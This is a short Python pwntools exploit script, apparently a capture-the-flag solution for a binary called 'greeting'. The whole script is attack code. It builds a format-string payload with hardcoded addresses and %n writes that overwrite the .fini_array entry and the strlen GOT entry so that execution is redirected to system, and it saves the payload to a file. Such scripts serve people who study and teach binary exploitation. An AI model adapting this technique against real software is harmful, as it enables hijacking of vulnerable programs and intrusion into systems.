from pwn import *

# Establish the target process
target = process('greeting')

# Right after vulnerable printf
#gdb.attach(target, gdbscript = 'b *0x08048654')

# The values we will be overwritting with
getline = 0x8048614
system = 0x8048490

# The values we will be overwritting
finiArray = 0x08049934
strlenGot = 0x08049a54

payload = ""
payload += "xx"
payload += p32(finiArray)
payload += p32(finiArray + 2)
payload += p32(strlenGot)
payload += p32(strlenGot + 2)

# Write 0x8614 to the lower two bytes of finiArray 
# 0x8614 - 0x24 = 34288
payload += "%34288x" + "%12$n"

# Write 0x8490 to the lower two bytes of strlenGot
# 0x18490 - 0x8614 = 65148
payload += "%65148x" + "%14$n"

# Write 0x804 to the higher two bytes of finiArray and strlenGot
# 0x10804 - 0x8490 = 33652

payload += "%33652x" + "%13$n"
payload += "%15$n"

f = open('payload','w')
f.write(payload)
f.close()
print payload
print len(payload)